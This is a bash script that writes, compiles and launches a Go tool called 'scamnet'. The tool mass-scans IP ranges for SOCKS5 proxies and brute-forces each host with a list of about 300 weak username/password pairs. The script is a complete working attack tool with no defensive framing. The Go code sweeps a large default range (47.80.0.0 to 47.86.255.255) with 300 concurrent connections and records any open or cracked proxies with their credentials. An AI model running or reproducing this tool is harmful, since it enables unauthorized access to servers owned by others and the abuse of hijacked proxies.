#!/bin/bash
# scamnet Go 内核修复版 - 修复所有编译错误

set -euo pipefail
IFS=$'\n\t'

RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
log() { echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $*"; }
err() { echo -e "${RED}[$(date '+%H:%M:%S')] [!] $*${NC}" >&2; }
succ() { echo -e "${GREEN}[$(date '+%H:%M:%S')] [+] $*${NC}"; }

LOG_DIR="logs"
mkdir -p "$LOG_DIR"
LATEST_LOG="$LOG_DIR/latest.log"

log "正在写入修复版 Go 内核代码 → scamnet.go"

cat > scamnet.go << 'EOF'
package main

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/sync/semaphore"
)

var (
	concurrency    = int64(300)
	timeOutSeconds = 6
	batchSize      = 10000
	validFile      = "socks5_valid.txt"
	weakPasswords  = []string{
		"admin:admin", "::", "0:0", "00:00", "000:000", "0000:0000", "00000:00000", "000000:000000",
		"1:1", "11:11", "111:111", "1111:1111", "11111:11111", "111111:111111",
		"2:2", "22:22", "222:222", "2222:2222", "22222:22222", "222222:222222",
		"3:3", "33:33", "333:333", "3333:3333", "33333:33333", "333333:333333",
		"4:4", "44:44", "444:444", "4444:4444", "44444:44444", "444444:444444",
		"5:5", "55:55", "555:555", "5555:5555", "55555:55555", "555555:555555",
		"6:6", "66:66", "666:666", "6666:6666", "66666:66666", "666666:666666",
		"7:7", "77:77", "777:777", "7777:7777", "77777:77777", "777777:777777",
		"8:8", "88:88", "888:888", "8888:8888", "88888:88888", "888888:888888",
		"9:9", "99:99", "999:999", "9999:9999", "99999:99999", "999999:999999",
		"1080:1080", "123:123", "123:321", "123:456", "123:abc", "123:qwe",
		"1234:1234", "1234:4321", "1234:5678", "1234:abcd", "1234:qwer",
		"12345:12345", "12345:54321", "12345:67890", "12345:678910", "12345:abcde", "12345:qwert",
		"123456:123456", "123456:654321", "123456:abcdef", "123456:qwerty", "123456:qwert",
		"12345678:12345678", "12345678:87654321", "123456789:123456789", "123456789:987654321",
		"123459:123459", "12349:12349", "1239:1239", "321:321", "520:520", "520:1314",
		"69:69", "6969:6969", "696969:696969", "a:a", "a:b", "aa:aa", "aaa:aaa", "aaaa:aaaa",
		"aaaaa:aaaaa", "aaaaaa:aaaaaa", "aaa:111", "aaa:123", "aaa:bbb", "a123:a123",
		"aa123:aa123", "aaa123:aaa123", "aa123456:aa123456", "a123456:a123456",
		"123aa:123aa", "123aaa:123aaa", "123abc:123abc", "ab:ab", "ab:cd", "abc:123",
		"abc:abc", "abc:cba", "abc:def", "abcdefg:abcdefg", "abc123:abc123", "abcde:abcde",
		"admin:", "admin:123", "admin:123456", "admin123:admin", "as:df", "asd:asd", "asd:fgh",
		"awsl:awsl", "b:b", "bb:bb", "bbb:bbb", "bbbb:bbbb", "bbbbb:bbbbb", "bbbbbb:bbbbbb",
		"c:c", "cc:cc", "ccc:ccc", "cccc:cccc", "ccccc:ccccc", "cccccc:cccccc", "cnmb:cnmb",
		"d:d", "dd:dd", "ddd:ddd", "dddd:dddd", "ddddd:ddddd", "dddddd:dddddd", "demo:demo",
		"e:e", "ee:ee", "eee:eee", "eeee:eeee", "eeeee:eeeee", "eeeeee:eeeeee",
		"f:f", "ff:ff", "fff:fff", "ffff:ffff", "fffff:fffff", "ffffff:ffffff", "fuckyou:fuckyou",
		"g:g", "gg:gg", "ggg:ggg", "gggg:gggg", "ggggg:ggggg", "gggggg:gggggg", "guest:guest",
		"h:h", "hh:hh", "hhh:hhh", "hhhh:hhhh", "hhhhh:hhhhh", "hhhhhh:hhhhhh", "hello:hello",
		"i:i", "ii:ii", "iii:iii", "iiii:iiii", "iiiii:iiiii", "iiiiii:iiiiii",
		"j:j", "jj:jj", "jjj:jjj", "jjjj:jjjj", "jjjjj:jjjjj", "jjjjjj:jjjjjj",
		"k:k", "kk:kk", "kkk:kkk", "kkkk:kkkk", "kkkkk:kkkkk", "kkkkkk:kkkkkk",
		"l:l", "ll:ll", "lll:lll", "llll:llll", "lllll:lllll", "llllll:llllll", "love:love",
		"m:m", "mm:mm", "mmm:mmm", "mmmm:mmmm", "mmmmm:mmmmm", "mmmmmm:mmmmmm",
		"n:n", "nn:nn", "nnn:nnn", "nnnn:nnnn", "nnnnn:nnnnn", "nnnnnn:nnnnnn", "nmsl:nmsl",
		"o:o", "oo:oo", "ooo:ooo", "oooo:oooo", "ooooo:ooooo", "oooooo:oooooo",
		"p:p", "pp:pp", "ppp:ppp", "pppp:pppp", "ppppp:ppppp", "pppppp:pppppp", "password:password",
		"proxy:proxy", "q:q", "qaq:qaq", "qaq:qwq", "qq:qq", "qqq:qqq", "qqqq:qqqq", "qqqqq:qqqqq",
		"qqqqqq:qqqqqq", "qwe:123", "qwe:asd", "qwe:qwe", "qwe123:qwe123", "qweasd:qweasd",
		"qwer:1234", "qwer:qwer", "qwert:12345", "qwert:qwert", "qwerty:123456", "qwerty:qwerty",
		"qwq:qaq", "qwq:qwe", "qwq:qwq", "r:r", "rr:rr", "rrr:rrr", "rrrr:rrrr", "rrrrr:rrrrr",
		"rrrrrr:rrrrrr", "root:root", "s:s", "s5:s5", "ss:ss", "sss:sss", "ssss:ssss", "sssss:sssss",
		"ssssss:ssssss", "socks:socks", "socks5:socks5", "t:t", "test:test", "test123:test123",
		"tt:tt", "ttt:ttt", "tttt:tttt", "ttttt:ttttt", "tttttt:tttttt", "u:u",
		"user:123", "user:1234", "user:12345", "user:123456", "user:pass", "user:password", "user:pwd",
		"user:user", "username:username", "uu:uu", "uuu:uuu", "uuuu:uuuu", "uuuuu:uuuuu", "uuuuuu:uuuuuu",
		"v:v", "vv:vv", "vvv:vvv", "vvvv:vvvv", "vvvvv:vvvvv", "vvvvvv:vvvvvv",
		"w:w", "wsnd:wsnd", "ww:ww", "www:www", "wwww:wwww", "wwwww:wwwww", "wwwwww:wwwwww",
		"x:x", "xx:xx", "xxx:xxx", "xxxx:xxxx", "xxxxx:xxxxx", "xxxxxx:xxxxxx",
		"y:y", "yy:yy", "yyy:yyy", "yyyy:yyyy", "yyyyy:yyyyy", "yyyyyy:yyyyyy",
		"z:z", "zz:zz", "zzz:zzz", "zzzz:zzzz", "zzzzz:zzzzz", "zzzzzz:zzzzzz",
	}
	countryCache sync.Map
	muValid     sync.Mutex
	validCount  int64 // 用 atomic.AddInt64/LoadInt64
	done        int64
)

func main() {
	// 初始化文件
	_ = os.WriteFile(validFile, []byte("# Go SOCKS5 Scanner - valid proxies (socks5://[user:pass@]ip:port#Country)\n"), 0644)

	reader := bufio.NewReader(os.Stdin)

	fmt.Print("起始 IP (默认 47.80.0.0): ")
	line, _ := reader.ReadString('\n')
	startIP := strings.TrimSpace(line)
	if startIP == "" {
		startIP = "47.80.0.0"
	}
	if !validIP(startIP) {
		fmt.Println("[!] 无效起始 IP")
		return
	}

	fmt.Print("结束 IP (默认 47.86.255.255): ")
	line, _ = reader.ReadString('\n')
	endIP := strings.TrimSpace(line)
	if endIP == "" {
		endIP = "47.86.255.255"
	}
	if !validIP(endIP) {
		fmt.Println("[!] 无效结束 IP")
		return
	}

	startI := ipToInt(startIP)
	endI := ipToInt(endIP)
	if startI > endI {
		startIP, endIP = endIP, startIP
		startI, endI = endI, startI
	}

	fmt.Print("端口 (默认 1080,8080,8888,3128 支持 , 或 a-b): ")
	line, _ = reader.ReadString('\n')
	portsStr := strings.TrimSpace(line)
	if portsStr == "" {
		portsStr = "1080,8080,8888,3128"
	}
	ports := parsePorts(portsStr)
	if len(ports) == 0 {
		fmt.Println("[!] 无效端口")
		return
	}

	ipCount := int(endI - startI + 1)
	total := uint64(ipCount) * uint64(len(ports))
	batchCount := (total + uint64(batchSize) - 1) / uint64(batchSize)

	fmt.Printf("[*] 范围: %s ~ %s (%d IP)\n", startIP, endIP, ipCount)
	fmt.Printf("[*] 端口: %v (%d 个)\n", ports, len(ports))
	fmt.Printf("[*] 总任务: %d | 批次: %d | 并发: %d | 超时: %ds | 弱口令: %d 条\n", total, batchCount, concurrency, timeOutSeconds, len(weakPasswords))
	fmt.Println("[*] 开始扫描 (Ctrl+C 可停止)...")

	go progressBar(total)

	for bstart := uint64(0); bstart < total; bstart += uint64(batchSize) {
		bend := bstart + uint64(batchSize)
		if bend > total {
			bend = total
		}
		fmt.Printf("\n[*] 批次 %d/%d → %d tasks\n", bstart/uint64(batchSize)+1, batchCount, bend-bstart)
		scanBatchByIndex(uint32(startI), uint32(endI), ports, bstart, bend)
	}

	time.Sleep(2 * time.Second)
	dedupAndReport(validFile)
	fmt.Printf("\n[+] 扫描完成！最终有效代理: %d 条\n", atomic.LoadInt64(&validCount))
	fmt.Printf("结果文件: %s\n", validFile)
	fmt.Println("查看: cat", validFile)
}

func scanBatchByIndex(startIP, endIP uint32, ports []int, batchStart, batchEnd uint64) {
	sem := semaphore.NewWeighted(concurrency)
	ctx := context.Background()
	var wg sync.WaitGroup
	taskIdx := batchStart
	for ipInt := startIP; ipInt <= endIP && taskIdx < batchEnd; ipInt++ {
		ip := intToIP(ipInt)
		for _, p := range ports {
			if taskIdx >= batchEnd {
				goto batchdone
			}
			wg.Add(1)
			go func(ipStr string, port int) {
				defer wg.Done()
				if acqErr := sem.Acquire(ctx, 1); acqErr != nil {
					return
				}
				defer sem.Release(1)
				scanTarget(ipStr, port)
				atomic.AddInt64(&done, 1)
			}(ip, p)
			taskIdx++
		}
	}
batchdone:
	wg.Wait()
}

func scanTarget(ip string, port int) {
	ok, lat, origin := testSocks5(ip, port, "", "")
	if ok {
		country := getCountry(origin)
		saveValid(ip, port, "", "", origin, lat, country)
		return
	}
	for _, pw := range weakPasswords {
		parts := strings.SplitN(pw, ":", 2)
		user := strings.TrimSpace(parts[0])
		pass := ""
		if len(parts) > 1 {
			pass = strings.TrimSpace(parts[1])
		}
		if user == "" && pass == "" {
			continue
		}
		ok, lat, origin = testSocks5(ip, port, user, pass)
		if ok {
			country := getCountry(origin)
			saveValid(ip, port, user, pass, origin, lat, country)
			return
		}
	}
}

func testSocks5(ip string, portInt int, user, pass string) (bool, int, string) {
	proxyStr := fmt.Sprintf("socks5://%s:%s@%s:%d", user, pass, ip, portInt)
	if user == "" && pass == "" {
		proxyStr = fmt.Sprintf("socks5://%s:%d", ip, portInt)
	}
	u, parseErr := url.Parse(proxyStr)
	if parseErr != nil {
		return false, 0, ""
	}
	tr := &http.Transport{
		Proxy:                 http.ProxyURL(u),
		DialContext:           (&net.Dialer{Timeout: 3 * time.Second}).DialContext,
		ResponseHeaderTimeout: 3 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}
	client := &http.Client{
		Transport:     tr,
		Timeout:       time.Duration(timeOutSeconds) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
	}
	start := time.Now()
	resp, err := client.Get("http://ifconfig.me")
	lat := int(time.Since(start).Milliseconds())
	if err != nil || resp.StatusCode != 200 {
		if resp != nil {
			resp.Body.Close()
		}
		return false, lat, ""
	}
	defer resp.Body.Close()
	bodyBytes, readErr := io.ReadAll(resp.Body)
	if readErr != nil {
		return false, lat, ""
	}
	origin := strings.TrimSpace(string(bodyBytes))
	if origin == "" || !strings.Contains(origin, ".") || lat > 6000 {
		return false, lat, ""
	}
	return true, lat, origin
}

func saveValid(ip string, port int, user, pass, origin string, lat int, country string) {
	muValid.Lock()
	defer muValid.Unlock()
	f, openErr := os.OpenFile(validFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if openErr != nil {
		return
	}
	defer f.Close()
	auth := ""
	if user != "" {
		auth = user + ":" + pass + "@"
	}
	line := fmt.Sprintf("socks5://%s%s:%d#%s", auth, ip, port, country)
	fmt.Fprintln(f, line)
	count := atomic.AddInt64(&validCount, 1)
	fmt.Printf("[+] #%d %s (%dms) 出站IP:%s 国家:%s\n", count, line, lat, origin, country)
}

func getCountry(ipStr string) string {
	if val, ok := countryCache.Load(ipStr); ok {
		return val.(string)
	}
	var code string
	apis := []string{
		fmt.Sprintf("http://ip-api.com/json/%s?fields=countryCode", ipStr),
		fmt.Sprintf("https://ipinfo.io/%s/country", ipStr),
		fmt.Sprintf("https://country.is/%s", ipStr),
	}
	for _, apiURL := range apis {
		cl := &http.Client{Timeout: 4 * time.Second}
		resp, err := cl.Get(apiURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		if resp.StatusCode != 200 {
			continue
		}
		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			continue
		}
		c := strings.TrimSpace(string(bodyBytes))
		matched := regexp.MustCompile(`^[A-Z]{2}$`).MatchString(c)
		if matched {
			code = c
			break
		}
	}
	if code == "" {
		code = "XX"
	}
	countryCache.Store(ipStr, code)
	return code
}

func progressBar(total uint64) {
	for {
		curr := atomic.LoadInt64(&done)
		if uint64(curr) >= total {
			break
		}
		ratio := float64(curr) / float64(total)
		filled := int(ratio * 50)
		bar := strings.Repeat("█", filled) + strings.Repeat("░", 50-filled)
		fmt.Printf("\r扫描进度: [%s] %.1f%% (%d/%d)", bar, ratio*100, curr, total)
		time.Sleep(300 * time.Millisecond)
	}
	fmt.Printf("\r扫描进度: [%s] 100.0%% (%d/%d)\n", strings.Repeat("█", 50), total, total)
}

func dedupAndReport(filename string) {
	f, err := os.Open(filename)
	if err != nil {
		return
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	seen := make(map[string]bool)
	for scanner.Scan() {
		l := strings.TrimSpace(scanner.Text())
		if l != "" && !strings.HasPrefix(l, "#") {
			seen[l] = true
		}
	}
	var lines []string
	for k := range seen {
		lines = append(lines, k)
	}
	sort.Strings(lines)
	tmpFile := filename + ".tmp"
	out, _ := os.Create(tmpFile)
	fmt.Fprintf(out, "# Deduped at %s\n", time.Now().Format("2006-01-02 15:04:05"))
	for _, l := range lines {
		fmt.Fprintln(out, l)
	}
	out.Close()
	os.Rename(tmpFile, filename)
	newCount := len(lines)
	fmt.Printf("[+] 去重完成: %d 条 (原始 %d 条)\n", newCount, atomic.LoadInt64(&validCount))
}

func validIP(s string) bool {
	return net.ParseIP(strings.TrimSpace(s)) != nil
}

func ipToInt(ip string) uint32 {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return 0
	}
	a, _ := strconv.Atoi(parts[0])
	b, _ := strconv.Atoi(parts[1])
	c, _ := strconv.Atoi(parts[2])
	d, _ := strconv.Atoi(parts[3])
	return uint32(a)<<24 | uint32(b)<<16 | uint32(c)<<8 | uint32(d)
}

func intToIP(n uint32) string {
	return fmt.Sprintf("%d.%d.%d.%d", byte(n>>24), byte(n>>16), byte(n>>8), byte(n))
}

func parsePorts(s string) []int {
	var ps []int
	seen := make(map[int]bool)
	for _, part := range strings.Split(s, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		if strings.Contains(part, "-") {
			rangeParts := strings.Split(part, "-")
			if len(rangeParts) != 2 {
				continue
			}
			start, err1 := strconv.Atoi(strings.TrimSpace(rangeParts[0]))
			end, err2 := strconv.Atoi(strings.TrimSpace(rangeParts[1]))
			if err1 != nil || err2 != nil || start < 1 || end > 65535 || start > end {
				continue
			}
			for i := start; i <= end; i++ {
				if !seen[i] {
					ps = append(ps, i)
					seen[i] = true
				}
			}
		} else {
			p, err := strconv.Atoi(part)
			if err != nil || p < 1 || p > 65535 {
				continue
			}
			if !seen[p] {
				ps = append(ps, p)
				seen[p] = true
			}
		}
	}
	sort.Ints(ps)
	return ps
}
EOF

log "下载依赖..."
go mod init scamnet >/dev/null 2>&1
go get golang.org/x/sync/semaphore >/dev/null 2>&1

log "编译修复版内核..."
if go build -ldflags="-s -w" -o scamnet scamnet.go; then
	succ "编译成功！"
else
	err "编译仍失败，请检查 Go 版本 >=1.18 (go version)"
	go version
	exit 1
fi

> "$LATEST_LOG"

succ "启动 Go 内核..."
echo "[*] 日志: tail -f $LATEST_LOG" >&2
echo "[*] 结果: cat socks5_valid.txt" >&2
echo "[*] Ctrl+C 停止" >&2

ulimit -n 65535 >/dev/null 2>&1 || true
./scamnet 2>&1 | tee -a "$LATEST_LOG"

succ "完成！"
echo "grep '\\[+]' $LATEST_LOG   # 只看命中"
echo "cat socks5_valid.txt       # 代理列表"
